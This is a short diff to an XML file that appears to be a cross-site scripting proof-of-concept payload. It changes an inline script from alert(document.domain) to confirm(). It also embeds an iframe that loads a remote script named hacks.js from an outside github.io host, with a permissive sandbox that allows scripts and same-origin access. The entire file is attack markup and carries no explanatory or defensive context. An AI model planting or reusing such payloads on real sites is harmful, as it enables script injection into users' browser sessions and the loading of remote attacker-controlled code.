@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <html xmlns:html="http://www.w3.org/1999/xhtml">
-<html:script>alert(document.domain);</html:script>
+<html:script>confirm();</html:script>
 <html:form><html:input name="test" value="asfd">
     </html:input><html:input type="submit">
     </html:input></html:form><html:iframe src="https://g0ziem.github.io/hacks.js" sandbox="allow-modals allow-forms allow-popups allow-scripts allow-same-origin">
